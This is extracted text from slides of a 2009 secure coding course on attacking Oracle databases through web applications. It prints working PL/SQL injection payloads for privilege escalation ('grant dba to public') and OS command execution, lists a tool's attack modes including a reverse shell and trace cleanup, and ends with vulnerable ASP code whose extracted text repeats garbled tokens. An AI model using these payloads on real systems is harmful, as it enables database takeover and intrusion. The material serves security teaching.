 DBMS_EXPORT_EXTENSION
 GET_DOMAIN_INDEX_TABLES()
– Function vulnerable to PL/SQL injection
– Runs with definer (SYS) privileges
– Allowed privilege escalation and OS Code execution from 
Privilege Escalation
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
49
– Allowed privilege escalation and OS Code execution from 
web apps
– Public can execute the function
 Fixed in CPU April 2006.
 Vulnerable versions: Oracle 8.1.7.4, 9.2.0.1 -
9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2,XE
Dan Haagman, InfoSecurity 2009
select
SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_
INDEX_TABLES('FOO','BAR','DBMS_OUTPUT"
.PUT(:P1);EXECUTE IMMEDIATE ''DECLARE
PRAGMA AUTONOMOUS_TRANSACTION;BEGIN
Privilege Escalation with DBMS_EXPORT_EXTENSION
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
50
PRAGMA AUTONOMOUS_TRANSACTION;BEGIN
EXECUTE IMMEDIATE '''' grant dba to
public'''';END;'';END;--
','SYS',0,'1',0) from dual
Dan Haagman, InfoSecurity 2009
Unprivileged
Upto 10.2.0.2 only, CPU July 2006 and earlier
Privileged
DBA privileges (not necessarily SYS DBA, 
OS Code Exection
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
51
DBA privileges (not necessarily SYS DBA, 
feature)
JAVA IO Privileges(10g R2, 11g R1, 11g R2, 
Feature)
Dan Haagman, InfoSecurity 2009
 Versions prior to CPU April 2006
– PL/SQL Injection allows OS Code execution
– A number of tools support this exploit
– Commercial
• Pangolin, Coreimpact
DBMS_EXPORT_EXTENSION
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
52
• Pangolin, Coreimpact
– Free
• Bsqlbf
• Supports OS code execution by following methods
– Based On Java (universal)
– PL/SQL native make utility (9i only)
– DBMS_scheduler (universal)
Dan Haagman, InfoSecurity 2009
 Functions:
– DBMS_JAVA.RUNJAVA()
• 11g R1 and R2
– DBMS_JAVA_TEST.FUNCALL()
With Java IO privileges
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
53
• 10g R2, 11g R1 and R2
 Java class allowing OS code execution by 
default
– oracle/aurora/util/Wrapper
Dan Haagman, InfoSecurity 2009
http://vuln.com?ora.php?id=1 AND (Select 
DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/W
rapper','main','c:\\windows\\system32\\cmd.exe'
With Java IO privilegs
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
54
rapper','main','c:\\windows\\system32\\cmd.exe'
,'/c', 'dir >c:\owned.txt') FROM DUAL) IS NULL --
Dan Haagman, InfoSecurity 2009
 DBA can already grant himself java IO privileges.
– The privileges are not available in same session
– The java class allowing OS code execution could be 
removed/changed in a future CPU
 Function: 
With DBA privileges
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
55
 Function: 
SYS.KUPP$PROC.CREATE_MASTER_PROCESS()
– Function executes arbitrary PL/SQL
– Executes any PL/SQL statement.
• Call DBMS_scheduler to run OS code 
Dan Haagman, InfoSecurity 2009
http://vuln.com?ora.php?id=1 AND (SELECT 
SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHED
ULER.create_program(''BSQLBFPROG'', 
''EXECUTABLE'', ''c:\WINDOWS\system32\cmd.exe 
/c dir>>c:\owned.txt'', 0, 
TRUE);DBMS_SCHEDULER.create_job(job_name => 
With DBA Privileges
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
56
TRUE);DBMS_SCHEDULER.create_job(job_name => 
''BSQLBFJOB'', program_name => ''BSQLBFPROG'', 
start_date => NULL, repeat_interval => NULL, 
end_date => NULL, enabled => TRUE, auto_drop => 
TRUE);dbms_lock.sleep(1);DBMS_SCHEDULER.drop_pr
ogram(PROGRAM_NAME => 
''BSQLBFPROG'');DBMS_SCHEDULER.PURGE_LOG;') 
from dual) IS NOT NULL --
Dan Haagman, InfoSecurity 2009
Modes of attack (-type switch) 
0:      Type 0 (default) is blind injection based on True and False responses
1:      Type 1 is blind injection based on True and Error responses
2:      Type 2 is injection in order by and group by
3:      Type 3 is extracting data with SYS privileges[ORACLE dbms_export_extension exploit]
4:      Type 4 is O.S code execution [ORACLE dbms_export_extension exploit]
5:      Type 5 is reading files [ORACLE dbms_export_extension exploit, based on java]
Bsqlbf 2.6
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
57
5:      Type 5 is reading files [ORACLE dbms_export_extension exploit, based on java]
6:      Type 6 is O.S code execution [ORACLE DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC exploit]
7:      Type 7 is O.S code execution [ORACLE SYS.KUPP$PROC.CREATE_MASTER_PROCESS(), DBA      
Privs]
-cmd=revshell [Type 7 supports meterpreter payload execution, run generator.exe first]
-cmd=cleanup [run this after exiting your metasploit session, it will clean up the traces]
8:      Type 8 is O.S code execution [ORACLE DBMS_JAVA_TEST.FUNCALL, with JAVA IO 
Permissions]
-cmd=revshell [Type 8 supports meterpreter payload execution, run generator.exe first]
Dan Haagman, InfoSecurity 2009
Bsqlbf demo
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
58
Dan Haagman, InfoSecurity 2009
 CSRF in Admin Section which has
– SQL Injection Vulnerability
– Allows Execution of SQL as a feature
Non Interactive SQL Injections
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
59
– Allows Execution of SQL as a feature
 Second Order SQL Injection in Admin section
Dan Haagman, InfoSecurity 2009
CSRF in Oracle Enterprise Manager 11g
7Safe Company Overview 2009
Secure Coding Course, © 7Safe
6/11/2010
Hacking Oracle from web apps
60
Dan Haagman, InfoSecurity 2009
Dim
Dim
Dim
Dim conn
conn
conn
conn, 
, 
, 
, rec
rec
rec
rec, query1, query2, 
, query1, query2, 
, query1, query2, 
, query1, query2, login_id
login_id
login_id
login_id, 
, 
, 
, old_pass
old_pass
old_pass
old_pass, 
, 
, 
, new_pass
new_pass
new_pass
new_pass
login_id
login_id
login_id
login_id = Replace(
= Replace(
= Replace(
= Replace(Request.Form
Request.Form
Request.Form
Request.Form(“
(“
(“
(“login_id
login_id
login_id
login_id”), “’”, “’’”)
”), “’”, “’’”)
”), “’”, “’’”)
”), “’”, “’’”)
old_pass
old_pass
old_pass
old_pass = Replace(
= Replace(
= Replace(
= Replace(Request.Form
Request.Form
Request.Form
Request.Form(“
(“
(“
(“old_pass
old_pass
old_pass
old_pass”), “’”, “’’”)
”), “’”, “’’”)
”), “’”, “’’”)
”), “’”, “’’”)
new_pass
new_pass
new_pass
new_pass = Replace(
= Replace(
= Replace(
= Replace(Request.Form
Request.Form
Request.Form
Request.Form(“
(“
(“
(“new_pass
new_pass
new_pass
new_pass”), “’”, “’’”)
”), “’”, “’’”)
”), “’”, “’’”)
”), “’”, “’’”)
Set 
Set 
Set 
Set conn
conn
conn
conn = 
= 
= 
= CreateObject
CreateObject
CreateObject
CreateObject((((""""ADODB.Connection
ADODB.Connection
ADODB.Connection
ADODB.Connection""""))))
conn.Open
conn.Open
conn.Open
conn.Open = 
= 
= 
= "DSN=
"DSN=
"DSN=
"DSN=AccountDB;UID
AccountDB;UID
AccountDB;UID
AccountDB;UID====sa;PWD
sa;PWD
sa;PWD
sa;PWD=password;"
=password;"
=password;"
=password;"
query1 = 
query1 = 
query1 = 
query1 = “select * from 
“select * from 
“select * from 
“select * from tbl_user
tbl_user
tbl_user
tbl_user where 
where 
where 
where login_id
login_id
login_id
login_id=’”
=’”
=’”
=’” & 
& 
& 
& login_id
login_id
login_id
login_id
& 
& 
& 
& “’ and password=‘”
“’ and password=‘”
“’ and password=‘”
“’ and password=‘” & 
& 
& 
& old_pass